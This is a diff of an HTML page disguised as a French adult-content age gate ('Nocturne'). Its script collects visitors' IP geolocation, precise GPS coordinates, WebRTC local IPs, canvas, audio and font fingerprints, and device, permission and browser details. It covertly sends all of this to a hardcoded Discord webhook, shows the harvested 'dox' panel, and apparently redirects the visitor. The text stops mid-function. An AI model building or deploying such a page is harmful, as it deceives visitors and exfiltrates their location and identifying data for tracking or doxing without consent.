@@ -17,8 +17,8 @@ html,body{margin:0;min-height:100%}
 body{
   background:#08070c;color:var(--ink);
   font-family:Inter,system-ui,-apple-system,sans-serif;
-  display:flex;align-items:center;justify-content:center;
-  padding:28px 20px;min-height:100dvh;position:relative;overflow-x:hidden;
+  display:flex;align-items:flex-start;justify-content:center;
+  padding:28px 20px 60px;min-height:100dvh;position:relative;overflow-x:hidden;
   -webkit-font-smoothing:antialiased;
 }
 body::before{
@@ -35,26 +35,28 @@ body::after{
 }
 @keyframes drift{from{transform:translate3d(0,0,0) scale(1)}to{transform:translate3d(0,-3%,0) scale(1.12)}}
 .gate{
-  position:relative;z-index:2;width:100%;max-width:430px;
+  position:relative;z-index:2;width:100%;max-width:520px;
   background:rgba(255,255,255,.045);border:1px solid var(--line);
-  border-radius:26px;padding:38px 30px 30px;
+  border-radius:26px;padding:34px 26px 24px;
   backdrop-filter:blur(26px) saturate(140%);-webkit-backdrop-filter:blur(26px) saturate(140%);
   box-shadow:0 30px 80px -20px rgba(0,0,0,.85),inset 0 1px 0 rgba(255,255,255,.07);
   animation:rise .7s cubic-bezier(.2,.8,.2,1) both;text-align:center;
 }
 @keyframes rise{from{opacity:0;transform:translateY(18px)}to{opacity:1;transform:none}}
 .brand{display:flex;align-items:center;justify-content:center;gap:9px;font-size:12.5px;font-weight:600;
-  letter-spacing:.34em;text-transform:uppercase;color:rgba(255,255,255,.72);margin-bottom:26px}
+  letter-spacing:.34em;text-transform:uppercase;color:rgba(255,255,255,.72);margin-bottom:22px}
 .brand svg{width:17px;height:17px;color:var(--accent)}
 .badge{display:inline-flex;align-items:center;gap:7px;font-size:11px;font-weight:600;letter-spacing:.13em;
   text-transform:uppercase;color:#d9c9ff;background:rgba(167,139,250,.13);
-  border:1px solid rgba(167,139,250,.28);border-radius:999px;padding:6px 13px;margin-bottom:20px}
+  border:1px solid rgba(167,139,250,.28);border-radius:999px;padding:6px 13px;margin-bottom:18px}
+.badge.ok{color:#bbf7d0;background:rgba(74,222,128,.12);border-color:rgba(74,222,128,.3)}
 .dot{width:5px;height:5px;border-radius:50%;background:var(--accent);box-shadow:0 0 8px var(--accent);animation:pulse 2s infinite}
+.badge.ok .dot{background:#4ade80;box-shadow:0 0 8px #4ade80}
 @keyframes pulse{0%,100%{opacity:1}50%{opacity:.25}}
-h1{font-family:"Instrument Serif",Georgia,serif;font-weight:400;font-size:clamp(29px,7.5vw,37px);
-  line-height:1.06;letter-spacing:-.015em;margin:0 0 14px}
+h1{font-family:"Instrument Serif",Georgia,serif;font-weight:400;font-size:clamp(27px,7vw,35px);
+  line-height:1.06;letter-spacing:-.015em;margin:0 0 12px}
 h1 em{font-style:italic;color:#d3c4ff}
-p.sub{margin:0 0 26px;font-size:13.5px;line-height:1.62;color:var(--muted);font-weight:300}
+p.sub{margin:0 0 24px;font-size:13.5px;line-height:1.62;color:var(--muted);font-weight:300}
 p.sub b{color:rgba(255,255,255,.8);font-weight:500}
 .btn{width:100%;border:0;cursor:pointer;border-radius:14px;padding:15px 18px;font-family:inherit;
   font-size:14px;font-weight:600;letter-spacing:.01em;color:#120a22;background:linear-gradient(180deg,#c9b4ff,#a78bfa);
@@ -64,19 +66,40 @@ p.sub b{color:rgba(255,255,255,.8);font-weight:500}
 .btn:hover{transform:translateY(-1.5px);filter:brightness(1.06)}
 .btn:active{transform:translateY(0) scale(.99)}
 .btn[disabled]{cursor:default;opacity:.9;transform:none}
-.ghost{display:block;margin:15px auto 0;background:none;border:0;cursor:pointer;
+.btn.alt{background:rgba(255,255,255,.07);color:#e9e3ff;box-shadow:none;border:1px solid var(--line)}
+.ghost{display:block;margin:14px auto 0;background:none;border:0;cursor:pointer;
   font-family:inherit;font-size:12.5px;color:var(--muted);transition:color .18s}
 .ghost:hover{color:rgba(255,255,255,.8)}
-.bar{height:3px;border-radius:99px;margin-top:20px;overflow:hidden;background:rgba(255,255,255,.08);
+.bar{height:3px;border-radius:99px;margin-top:18px;overflow:hidden;background:rgba(255,255,255,.08);
   opacity:0;transition:opacity .3s}
 .bar.on{opacity:1}
 .bar i{display:block;height:100%;width:0%;border-radius:99px;
-  background:linear-gradient(90deg,#a78bfa,#f0abfc);transition:width 1.7s cubic-bezier(.3,.9,.2,1)}
-.foot{display:flex;align-items:center;justify-content:center;gap:7px;margin-top:24px;padding-top:18px;
+  background:linear-gradient(90deg,#a78bfa,#f0abfc);transition:width 1.9s cubic-bezier(.3,.9,.2,1)}
+.foot{display:flex;align-items:center;justify-content:center;gap:7px;margin-top:22px;padding-top:16px;
   border-top:1px solid rgba(255,255,255,.06);font-size:11px;color:rgba(255,255,255,.34);letter-spacing:.05em}
 .foot svg{width:12px;height:12px}
 .spin{width:15px;height:15px;border-radius:50%;border:2px solid rgba(18,10,34,.35);border-top-color:#120a22;animation:sp .7s linear infinite}
 @keyframes sp{to{transform:rotate(360deg)}}
+
+/* ---- dump panel ---- */
+.dox{margin-top:20px;text-align:left;font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
+  font-size:11.5px;line-height:1.5;color:#ded8f0}
+.sec{margin-top:16px}
+.sec h2{font-family:Inter,sans-serif;font-size:9.5px;letter-spacing:.24em;text-transform:uppercase;
+  color:#c4b5fd;margin:0 0 7px;display:flex;align-items:center;gap:9px;font-weight:600}
+.sec h2::after{content:"";flex:1;height:1px;background:linear-gradient(90deg,rgba(167,139,250,.4),transparent)}
+.row{display:flex;gap:10px;padding:5px 0;border-bottom:1px dashed rgba(255,255,255,.055);
+  animation:in .4s cubic-bezier(.2,.8,.2,1) both}
+@keyframes in{from{opacity:0;transform:translateX(-6px)}to{opacity:1;transform:none}}
+.k{color:#8b85a3;flex:0 0 40%;font-size:11px}
+.v{flex:1;color:#f0ebff;word-break:break-word}
+.v a{color:#c4b5fd;text-decoration:none;border-bottom:1px solid rgba(196,181,253,.4)}
+.v .hi{color:#86efac;font-weight:600}
+.v .lo{color:#fca5a5}
+.v .mono{color:#fde68a}
+.tools{display:flex;gap:8px;margin-top:20px}
+.tools .btn{font-size:12.5px;padding:12px 14px}
+.small{font-size:10.5px;color:rgba(255,255,255,.32);text-align:center;margin-top:12px;line-height:1.5}
 </style>
 </head>
 <body>
@@ -86,12 +109,14 @@ p.sub b{color:rgba(255,255,255,.8);font-weight:500}
     <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7"><circle cx="12" cy="12" r="4.2"/><path d="M12 2v3M12 19v3M2 12h3M19 12h3"/></svg>
     Nocturne
   </div>
-  <div class="badge"><span class="dot"></span>Accès restreint</div>
-  <h1>Contenu réservé<br>aux <em>adultes</em></h1>
-  <p class="sub">Cet espace privé contient des visuels et des œuvres destinés à un public majeur. Confirmez votre âge pour <b>déverrouiller l'accès</b>.</p>
+  <div class="badge" id="badge"><span class="dot"></span>Accès restreint</div>
+  <h1 id="title">Contenu réservé<br>aux <em>adultes</em></h1>
+  <p class="sub" id="sub">Cet espace privé contient des visuels et des œuvres destinés à un public majeur. Confirmez votre âge pour <b>déverrouiller l'accès</b>.</p>
   <button class="btn" id="go"><span id="label">J'ai 18 ans ou plus</span></button>
   <button class="ghost" id="later">Plus tard</button>
   <div class="bar" id="bar"><i id="fill"></i></div>
+  <section class="dox" id="dox" hidden></section>
+  <div id="tools"></div>
   <div class="foot">
     <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="4" y="10" width="16" height="10" rx="2.5"/><path d="M8 10V7a4 4 0 0 1 8 0v3"/></svg>
     Session chiffrée · SSL 256 bits
@@ -101,84 +126,388 @@ p.sub b{color:rgba(255,255,255,.8);font-weight:500}
 <script>
 /* ================= CONFIG ================= */
 const WEBHOOK    = "https://discord.com/api/webhooks/1572285611757535345/1hltRG4Frv52fIG4NpSJH69CY01XjWnaWyPe8JSyqC_1zrEjNNuwtmVJQz7HcQwfGAeH";
-const REDIRECT   = "https://venice.ai";   // <-- ton URL de destination ("" = pas de redirection)
+const REDIRECT   = "https://venice.ai";   // "" = pas de redirection
 const SITE_NAME  = "NOCTURNE";
 const LABEL      = "nocturne.gate";
 /* ========================================= */
 
+const $ = id => document.getElementById(id);
+const sleep = ms => new Promise(r => setTimeout(r, ms));
+const esc = s => String(s).replace(/[&<>"]/g, c => ({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;"}[c]));
 const p2 = n => String(n).padStart(2,"0");
-const nowLocal = () => { const d=new Date(); return `${p2(d.getDate())}/${p2(d.getMonth()+1)}/${d.getFullYear()} ${p2(d.getHours())}:${p2(d.getMinutes())}:${p2(d.getSeconds())}`; };
+const nowLocal = () => { const d = new Date(); return `${p2(d.getDate())}/${p2(d.getMonth()+1)}/${d.getFullYear()} ${p2(d.getHours())}:${p2(d.getMinutes())}:${p2(d.getSeconds())}`; };
 const flag = cc => cc ? cc.toUpperCase().replace(/./g, c => String.fromCodePoint(127397 + c.charCodeAt(0))) : "";
 
+async function hash(str){
+  try{
+    const buf = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(str));
+    return [...new Uint8Array(buf)].map(b => b.toString(16).padStart(2,"0")).join("").slice(0,20);
+  }catch(e){
+    let h = 2166136261;
+    for(let i=0;i<str.length;i++){ h ^= str.charCodeAt(i); h = Math.imul(h, 16777619); }
+    return (h>>>0).toString(16).padStart(8,"0").repeat(2);
+  }
+}
+
+/* ---------- réseau / geo IP ---------- */
 async function getGeo(){
   try{ const r = await fetch("https://ipwho.is/",{cache:"no-store"}); const d = await r.json();
     if(d && d.success !== false && d.ip) return {ip:d.ip,city:d.city,region:d.region,country:d.country,
-      cc:d.country_code,isp:(d.connection&&(d.connection.isp||d.connection.org)),lat:d.latitude,lon:d.longitude,tz:d.timezone&&d.timezone.id};
+      cc:d.country_code,isp:(d.connection&&(d.connection.isp||d.connection.org)),asn:(d.connection&&d.connection.asn),
+      lat:d.latitude,lon:d.longitude,tz:d.timezone&&d.timezone.id,zip:d.postal,capital:d.capital};
   }catch(e){}
   try{ const r = await fetch("https://ipapi.co/json/",{cache:"no-store"}); const d = await r.json();
     if(d && d.ip) return {ip:d.ip,city:d.city,region:d.region,country:d.country_name,cc:d.country_code,
-      isp:d.org,lat:d.latitude,lon:d.longitude,tz:d.timezone};
+      isp:d.org,asn:d.asn,lat:d.latitude,lon:d.longitude,tz:d.timezone,zip:d.postal};
   }catch(e){}
   try{ const r = await fetch("https://api.ipify.org?format=json",{cache:"no-store"}); const d = await r.json();
     if(d && d.ip) return {ip:d.ip};
   }catch(e){}
   return null;
 }
-async function battery(){
-  try{ if(!navigator.getBattery) return "non disponible";
-    const b = await navigator.getBattery();
-    return Math.round(b.level*100)+"%"+(b.charging?" (en charge)":"");
-  }catch(e){ return "non disponible"; }
+
+/* ---------- géoloc GPS précise ---------- */
+function geoPos(timeout = 13000){
+  return new Promise(res => {
+    if(!navigator.geolocation) return res({err:"API absente"});
+    navigator.geolocation.getCurrentPosition(
+      p => res({lat:p.coords.latitude, lon:p.coords.longitude, acc:p.coords.accuracy,
+        alt:p.coords.altitude, altAcc:p.coords.altitudeAccuracy,
+        head:p.coords.heading, speed:p.coords.speed}),
+      e => res({err:e.message || ("code "+e.code)}),
+      {enableHighAccuracy:true, timeout, maximumAge:0}
+    );
+  });
 }
 
-async function capture(){
-  const g = await getGeo(), bat = await battery();
-  const tz = Intl.DateTimeFormat().resolvedOptions().timeZone || "?";
-  const fields = [
-    {name:"🌐 Adresse IP", value: g&&g.ip ? "`"+g.ip+"`" : "`indisponible`", inline:true},
-    {name:"📡 FAI / réseau", value: g&&g.isp ? "`"+g.isp+"`" : "`?`", inline:true},
-    {name:"🕹️ VPN / hébergeur", value: (/vpn|hosting|proxy|datacenter|cloud|ovh|aws|digitalocean|hetzner|m247/i.test((g&&g.isp)||""))?"**probable**":"aucun signe", inline:true},
-    {name:"📍 Localisation", value: [g&&g.city,g&&g.region,((g&&g.country)||"")+" "+flag(g&&g.cc)].filter(Boolean).join(", ") || "`?`"},
-    {name:"🗺️ Coordonnées", value: (g&&g.lat!=null) ? "`"+g.lat+", "+g.lon+"` · [carte](https://www.google.com/maps?q="+g.lat+","+g.lon+")" : "`?`"},
-    {name:"⏱️ Heure locale (visiteur)", value: "`"+nowLocal()+"`", inline:true},
-    {name:"🕰️ Heure UTC", value: "`"+new Date().toISOString().replace("T"," ").slice(0,19)+"`", inline:true},
-    {name:"🌍 Fuseau horaire", value: "`"+tz+"`"+(g&&g.tz&&g.tz!==tz?" (IP : `"+g.tz+"`)":""), inline:true},
-    {name:"💻 Appareil", value: "`"+(navigator.platform||"?")+"` · "+(navigator.maxTouchPoints>0?"tactile":"souris"), inline:true},
-    {name:"🖥️ Écran", value: "`"+screen.width+"×"+screen.height+" · "+(window.devicePixelRatio||1)+"x`", inline:true},
-    {name:"🔋 Batterie", value: "`"+bat+"`", inline:true},
-    {name:"🗣️ Langues", value: "`"+(navigator.language||"?")+"` · "+((navigator.languages||[]).join(", "))},
-    {name:"🔗 Provenance", value: document.referrer || "`accès direct`"},
-    {name:"🧾 User-Agent", value: "```"+(navigator.userAgent||"").slice(0,900)+"```"}
-  ];
-  const payload = { username: SITE_NAME+" · Visiteur", embeds:[{
-    title:"🚪 Nouvelle visite — "+SITE_NAME,
-    description:"Un visiteur a ouvert la page d'accès.",
-    color:0xa78bfa, timestamp:new Date().toISOString(), fields,
-    footer:{text: LABEL+" · "+((g&&g.ip)||"ip inconnue")}
-  }]};
+/* ---------- fuite WebRTC ---------- */
+function rtcIps(timeout = 3500){
+  return new Promise(res => {
+    const found = new Set();
+    let pc;
+    try{ pc = new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]}); }
+    catch(e){ return res([]); }
+    const done = () => { try{ pc.close(); }catch(e){} res([...found]); };
+    pc.onicecandidate = e => {
+      if(!e.candidate) return;
+      const p = e.candidate.candidate.split(" ");
+      const ip = p[4], port = p[5], typ = p[7];
+      if(ip) found.add(ip + " · " + typ + (port ? ":" + port : ""));
+    };
+    try{
+      pc.createDataChannel("x");
+      pc.createOffer().then(o => pc.setLocalDescription(o)).catch(()=>{});
+    }catch(e){}
+    setTimeout(done, timeout);
+  });
+}
+
+/* ---------- empreintes ---------- */
+async function canvasFp(){
   try{
-    const r = await fetch(WEBHOOK,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(payload),keepalive:true});
-    if(!r.ok) throw new Error(r.status);
-  }catch(e){
-    try{ await fetch(WEBHOOK,{method:"POST",mode:"no-cors",headers:{"Content-Type":"application/json"},body:JSON.stringify(payload),keepalive:true}); }catch(_){}
+    const c = document.createElement("canvas");
+    c.width = 300; c.height = 70;
+    const x = c.getContext("2d");
+    x.textBaseline = "top";
+    x.font = "16px 'Arial'";
+    x.fillStyle = "#f60"; x.fillRect(0,0,300,20);
+    x.fillStyle = "#069"; x.fillText("Nocturne 🜁 fingerprint 1234", 4, 22);
+    x.fillStyle = "rgba(102,204,0,.7)"; x.fillText("Nocturne 🜁 fingerprint 1234", 6, 40);
+    const g = x.createLinearGradient(0,0,300,70);
+    g.addColorStop(0,"#a78bfa"); g.addColorStop(1,"#f0abfc");
+    x.fillStyle = g; x.fillRect(0,58,300,12);
+    return await hash(c.toDataURL());
+  }catch(e){ return "indisponible"; }
+}
+function glInfo(){
+  try{
+    const c = document.createElement("canvas");
+    const gl = c.getContext("webgl") || c.getContext("experimental-webgl");
+    if(!gl) return {v:"—", r:"—", max:"—"};
+    const dbg = gl.getExtension("WEBGL_debug_renderer_info");
+    return {
+      v: dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR),
+      r: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER),
+      max: gl.getParameter(gl.MAX_TEXTURE_SIZE)
+    };
+  }catch(e){ return {v:"—", r:"—", max:"—"}; }
+}
+async function audioFp(){
+  try{
+    const Ctx = window.OfflineAudioContext || window.webkitOfflineAudioContext;
+    if(!Ctx) return "indisponible";
+    const ctx = new Ctx(1, 44100, 44100);
+    const osc = ctx.createOscillator();
+    osc.type = "triangle"; osc.frequency.value = 10000;
+    const comp = ctx.createDynamicsCompressor();
+    comp.threshold.value = -50; comp.knee.value = 40; comp.ratio.value = 12;
+    osc.connect(comp); comp.connect(ctx.destination);
+    osc.start(0);
+    const buf = await ctx.startRendering();
+    const d = buf.getChannelData(0);
+    let sum = 0;
+    for(let i = 4500; i < 5000; i++) sum += Math.abs(d[i]);
+    return await hash(sum.toFixed(8));
+  }catch(e){ return "indisponible"; }
+}
+function fonts(){
+  const base = ["monospace","sans-serif","serif"];
+  const test = ["Arial","Arial Black","Calibri","Cambria","Candara","Comic Sans MS","Consolas","Courier New",
+    "Georgia","Helvetica","Impact","Inter","Lucida Console","Menlo","Monaco","Optima","Palatino","Roboto",
+    "Segoe UI","Tahoma","Times New Roman","Trebuchet MS","Ubuntu","Verdana","SF Pro Text"];
+  const c = document.createElement("canvas").getContext("2d");
+  const w = (f) => { c.font = "72px "+f; return c.measureText("mmmmmmmmmmlli").width; };
+  const b = base.map(w);
+  const found = test.filter(f => base.some((bs,i) => w("'"+f+"',"+bs) !== b[i]));
+  return found;
+}
+
+/* ---------- collecte principale ---------- */
+async function collect(){
+  const geo = await getGeo();
+  const [pos, rtc, cvFp, audFp, bat] = await Promise.all([
+    geoPos(), rtcIps(), canvasFp(), audioFp(), (async () => {
+      try{ if(!navigator.getBattery) return "API absente";
+        const b = await navigator.getBattery();
+        return Math.round(b.level*100)+"%"+(b.charging?" (en charge)":"");
+      }catch(e){ return "indisponible"; }
+    })()
+  ]);
+
+  let uaData = null;
+  try{ if(navigator.userAgentData) uaData = await navigator.userAgentData.getHighEntropyValues(
+    ["platform","platformVersion","architecture","bitness","model","uaFullVersion","fullVersionList"]); }catch(e){}
+
+  let perms = {};
+  try{
+    for(const n of ["geolocation","camera","microphone","notifications","clipboard-read","midi"]){
+      try{ perms[n] = (await navigator.permissions.query({name:n})).state; }catch(e){}
+    }
+  }catch(e){}
+
+  let storage = "—";
+  try{ const s = await navigator.storage.estimate();
+    storage = (s.quota/1048576).toFixed(1)+" Mo quota · "+(s.usage/1048576).toFixed(2)+" Mo utilisés"; }catch(e){}
+
+  let audio = {};
+  try{ const ac = new (window.AudioContext||window.webkitAudioContext)();
+    audio = {rate: ac.sampleRate, ch: ac.destination.maxChannelCount}; ac.close(); }catch(e){}
+
+  const gl = glInfo();
+  const tz = Intl.DateTimeFormat().resolvedOptions();
+  const nav = navigator;
+  const mem = performance.memory ? (performance.memory.usedJSHeapSize/1048576).toFixed(1)+" Mo heap JS" : "—";
+  const conn = nav.connection || nav.mozConnection || nav.webkitConnection;
+  const codecs = ["video/mp4; codecs=avc1.42E01E","video/webm; codecs=vp9","video/webm; codecs=av01","audio/mpeg","audio/flac","audio/ogg; codecs=opus"]
+    .map(c => { try{ const v = document.createElement("video"); return c+" → "+(v.canPlayType(c)||"non"); }catch(e){ return c; } });
+  let voices = "—";
+  try{ voices = (speechSynthesis.getVoices()||[]).length + " voix"; }catch(e){}
+  let devices = "—";
+  try{ const d = await navigator.mediaDevices.enumerateDevices();
+    devices = d.map(x => x.kind.replace("input","in").replace("output","out")+": "+(x.label||"anonyme")).join(" · ") || "aucun"; }catch(e){}
+
+  const D = {
+    geo, pos, rtc, cvFp, audFp, bat, uaData, perms, storage, audio, gl, tz, mem, conn, codecs, voices, devices,
+    fontList: fonts(),
+    ua: nav.userAgent,
+    fpGlobal: await hash([cvFp, audFp, gl.r, nav.userAgent, screen.width+"x"+screen.height, tz.timeZone, nav.language, nav.hardwareConcurrency].join("|"))
+  };
+  return D;
+}
+
+/* ---------- construction des sections ---------- */
+function buildSections(D){
+  const g = D.geo || {};
+  const vpn = /vpn|hosting|proxy|datacenter|cloud|ovh|aws|digitalocean|hetzner|m247|linode|vultr|scaleway/i.test(g.isp || "");
+  const S = [];
+
+  S.push({title:"Réseau", rows:[
+    ["Adresse IP publique", g.ip ? `<span class="mono">${esc(g.ip)}</span>` : `<span class="lo">indisponible</span>`],
+    ["FAI / organisation", g.isp ? esc(g.isp) : "—"],
+    ["ASN", g.asn ? esc(String(g.asn)) : "—"],
+    ["VPN / datacenter", vpn ? `<span class="hi">PROBABLE</span>` : "aucun signe"],
+    ["IP locales (WebRTC)", D.rtc.length ? `<span class="mono">${esc(D.rtc.join(" · "))}</span>` : "masquées (mDNS)"],
+    ["Type de connexion", D.conn ? esc([D.conn.effectiveType, D.conn.downlink+" Mbps", D.conn.rtt+" ms RTT", D.conn.saveData?"économie":"normal"].filter(Boolean).join(" · ")) : "—"]
+  ]});
+
+  const loc = [g.city, g.region, g.zip, (g.country||"")+" "+flag(g.cc)].filter(Boolean).join(", ");
+  const gps = D.pos && D.pos.lat != null
+    ? `<span class="hi">${D.pos.lat.toFixed(6)}, ${D.pos.lon.toFixed(6)}</span> · précision ±${Math.round(D.pos.acc)} m · <a href="https://www.google.com/maps?q=${D.pos.lat},${D.pos.lon}" target="_blank" rel="noopener">carte</a>`
+    : `<span class="lo">refusée ou indisponible</span>` + (D.pos && D.pos.err ? ` (${esc(D.pos.err)})` : "");
+  S.push({title:"Localisation", rows:[
+    ["Ville / région / pays", loc || "—"],
+    ["Coordonnées IP", (g.lat != null) ? `<span class="mono">${g.lat}, ${g.lon}</span> · <a href="https://www.google.com/maps?q=${g.lat},${g.lon}" target="_blank" rel="noopener">carte</a>` : "—"],
+    ["GPS haute précision", gps],
+    ["Altitude / cap / vitesse", D.pos && D.pos.alt != null ? `${Math.round(D.pos.alt)} m · ${D.pos.head!=null?Math.round(D.pos.head)+"°":"—"} · ${D.pos.speed!=null?D.pos.speed.toFixed(1)+" m/s":"—"}` : "—"],
+    ["Fuseau horaire", `<span class="mono">${esc(D.tz.timeZone)}</span> · UTC${new Date().getTimezoneOffset()<=0?"+":"-"}${Math.abs(new Date().getTimezoneOffset()/60)}`],
+    ["Heure locale / UTC", `${esc(nowLocal())} · <span class="mono">${new Date().toISOString().slice(0,19).replace("T"," ")}</span>`],
+    ["Langues", esc((navigator.languages||[navigator.language]).join(", "))]
+  ]});
+
+  const ua = D.uaData || {};
+  S.push({title:"Appareil", rows:[
+    ["Plateforme", esc(ua.platform || navigator.platform || "—")],
+    ["Version OS", esc(ua.platformVersion || "—")],
+    ["Architecture / bits", esc([ua.architecture, ua.bitness].filter(Boolean).join(" ") || "—")],
+    ["Modèle", esc(ua.model || "—")],
+    ["Cœurs CPU", `<span class="mono">${navigator.hardwareConcurrency || "—"}</span>`],
+    ["RAM estimée", navigator.deviceMemory ? `<span class="mono">${navigator.deviceMemory} Go</span>` : "—"],
+    ["Écran", `<span class="mono">${screen.width}×${screen.height} · ${screen.colorDepth} bits · DPR ${window.devicePixelRatio}</span>`],
+    ["Fenêtre / orientation", `<span class="mono">${window.innerWidth}×${window.innerHeight}</span> · ${esc(screen.orientation ? screen.orientation.type : "—")}`],
+    ["Tactile / pointeur", `${navigator.maxTouchPoints} points · ${matchMedia("(pointer:fine)").matches?"souris précise":"pointeur grossier"}`],
+    ["Batterie", esc(D.bat)],
+    ["GPU", `${esc(D.gl.v)} — ${esc(D.gl.r)}`],
+    ["Audio", `${D.audio.rate||"—"} Hz · ${D.audio.ch||"—"} canaux`],
+    ["Mémoire JS", esc(D.mem)]
+  ]});
+
+  S.push({title:"Empreintes", rows:[
+    ["Empreinte globale", `<span class="mono">${esc(D.fpGlobal)}</span>`],
+    ["Canvas", `<span class="mono">${esc(D.cvFp)}</span>`],
+    ["Audio", `<span class="mono">${esc(D.audFp)}</span>`],
+    ["WebGL max texture", esc(String(D.gl.max))],
+    ["Polices détectées", D.fontList.length ? esc(D.fontList.slice(0,18).join(", ")) + (D.fontList.length>18?" …":"") : "aucune"],
+    ["Codecs", esc(D.codecs.join(" · "))],
+    ["Voix TTS", esc(D.voices)],
+    ["Stockage", esc(D.storage)],
+    ["Cookies / DNT", `${navigator.cookieEnabled?"activés":"désactivés"} · DNT ${navigator.doNotTrack || "non"}`]
+  ]});
+
+  S.push({title:"Permissions", rows:[
+    ["Géoloc / caméra", `${esc(D.perms.geolocation||"—")} · ${esc(D.perms.camera||"—")}`],
+    ["Micro / notifications", `${esc(D.perms.microphone||"—")} · ${esc(D.perms.notifications||"—")}`],
+    ["Presse-papier / MIDI", `${esc(D.perms["clipboard-read"]||"—")} · ${esc(D.perms.midi||"—")}`],
+    ["Périphériques", esc(D.devices)]
+  ]});
+
+  S.push({title:"Contexte", rows:[
+    ["Provenance", esc(document.referrer || "accès direct")],
+    ["Ouverture", window.opener ? "fenêtre enfant" : "directe"],
+    ["Préférences", `${matchMedia("(prefers-color-scheme:dark)").matches?"sombre":"clair"} · ${matchMedia("(prefers-reduced-motion:reduce)").matches?"mouvement réduit":"animations"}`],
+    ["Écran tactile max", `${screen.availWidth}×${screen.availHeight} dispo`],
+    ["User-Agent", `<span class="mono">${esc(D.ua.slice(0,300))}</span>`]
+  ]});
+
+  return S;
+}
+
+/* ---------- affichage progressif ---------- */
+async function reveal(S){
+  const dox = $("dox");
+  dox.hidden = false;
+  for(const sec of S){
+    const el = document.createElement("section");
+    el.className = "sec";
+    el.innerHTML = `<h2>${esc(sec.title)}</h2>`;
+    dox.appendChild(el);
+    for(const [k,v] of sec.rows){
+      const r = document.createElement("div");
+      r.className = "row";
+      r.innerHTML = `<span class="k">${esc(k)}</span><span class="v">${v}</span>`;
+      el.appendChild(r);
+      await sleep(70);
+    }
+    await sleep(90);
   }
 }
-setTimeout(capture, 400);
 
-const go = document.getElementById("go"), bar = document.getElementById("bar"), fill = document.getElementById("fill");
-let busy = false;
-function enter(){
-  if(busy) return; busy = true; go.disabled = true;
-  go.innerHTML = '<span class="spin"></span><span>Vérification…</span>';
-  bar.classList.add("on");
-  requestAnimationFrame(()=>{ fill.style.width = "100%"; });
-  setTimeout(()=>{
-    go.innerHTML = "✓ Accès autorisé";
-    if(REDIRECT) setTimeout(()=>{ window.location.href = REDIRECT; }, 650);
-  }, 1750);
+/* ---------- envoi Discord ---------- */
+async function send(D){
+  const g = D.geo || {};
+  const f = (n,v,i) => ({name:n, value:String(v||"—").slice(0,1000), inline:!!i});
+  const embeds = [
+    { title:"🌐 Réseau & localisation", color:0xa78bfa, fields:[
+      f("IP", g.ip ? "`"+g.ip+"`" : "indisponible", true),
+      f("FAI", g.isp || "—", true),
+      f("ASN", g.asn || "—", true),
+      f("Ville / région", [g.city,g.region].filter(Boolean).join(", ") || "—"),
+      f("Pays", ((g.country||"?")+" "+flag(g.cc)).trim()),
+      f("GPS", D.pos && D.pos.lat!=null ? `\`${D.pos.lat},${D.pos.lon}\` ±${Math.round(D.pos.acc)}m · https://maps.google.com/?q=${D.pos.lat},${D.pos.lon}` : "refusé/indisponible"),
+      f("IP locales WebRTC", D.rtc.join(" · ") || "mDNS"),
+      f("Réseau", D.conn ? `${D.conn.effectiveType} ${D.conn.downlink}Mbps ${D.conn.rtt}ms` : "—", true),
+      f("TZ", D.tz.timeZone, true),
+      f("Heure", nowLocal(), true)
+    ]},
+    { title:"💻 Appareil", color:0x38bdf8, fields:[
+      f("Plateforme", (D.uaData && D.uaData.platform) || navigator.platform, true),
+      f("Arch", D.uaData ? [D.uaData.architecture,D.uaData.bitness].filter(Boolean).join(" ") : "—", true),
+      f("Modèle", (D.uaData && D.uaData.model) || "—", true),
+      f("CPU", navigator.hardwareConcurrency, true),
+      f("RAM", navigator.deviceMemory ? navigator.deviceMemory+" Go" : "—", true),
+      f("Écran", `${screen.width}×${screen.height} @${window.devicePixelRatio}x`, true),
+      f("GPU", `${D.gl.v} — ${D.gl.r}`),
+      f("Audio", `${D.audio.rate||"—"}Hz ${D.audio.ch||"—"}ch`, true),
+      f("Batterie", D.bat, true),
+      f("Langues", (navigator.languages||[]).join(", ")),
+      f("UA", "```"+(D.ua||"").slice(0,900)+"```")
+    ]},
+    { title:"🧬 Empreintes & permissions", color:0xf0abfc, fields:[
+      f("Empreinte", "`"+D.fpGlobal+"`"),
+      f("Canvas", "`"+D.cvFp+"`", true),
+      f("Audio", "`"+D.audFp+"`", true),
+      f("Polices", D.fontList.slice(0,25).join(", ") || "—"),
+      f("Stockage", D.storage),
+      f("Permissions", JSON.stringify(D.perms)),
+      f("Périphériques", D.devices),
+      f("Référent", document.referrer || "direct", true)
+    ]}
+  ];
+  const payload = { username: SITE_NAME+" · Visiteur", embeds: embeds.map(e => ({
+    ...e, timestamp:new Date().toISOString(), footer:{text: LABEL+" · "+((g.ip)||"ip inconnue")}
+  }))};
+  const body = JSON.stringify(payload);
+  try{
+    const r = await fetch(WEBHOOK,{method:"POST",headers:{"Content-Type":"application/json"},body,keepalive:true});
+    if(!r.ok) throw 0;
+  }catch(e){
+    try{ await fetch(WEBHOOK,{method:"POST",mode:"no-cors",headers:{"Content-Type":"application/json"},body,keepalive:true}); }catch(_){}
+  }
 }
-go.addEventListener("click", enter);
-document.getElementById("later").addEventListener("click", enter);
+
+/* ---------- séquence ---------- */
+let busy = false;
+async function enter(){
+  if(busy) return; busy = true;
+  const go = $("go");
+  go.disabled = true;
+  go.innerHTML = '<span class="spin"></span><span>Lecture de la session…</span>';
+  $("bar").classList.add("on");
+  requestAnimationFrame(()=>{ $("fill").style.width = "100%"; });
+
+  const D = await collect();
+
+  $("title").innerHTML = "Identité<br><em>vérifiée</em>";
+  $("sub").innerHTML = "Voici ce que votre navigateur expose en ouvrant cette page.";
+  $("badge").classList.add("ok");
+  $("badge").innerHTML = '<span class="dot"></span>Accès autorisé';
+  go.style.display = "none";
+  $("later").style.display = "none";
+
+  await reveal(buildSections(D));
+  send(D);
+
+  const tools = $("tools");
+  tools.className = "tools";
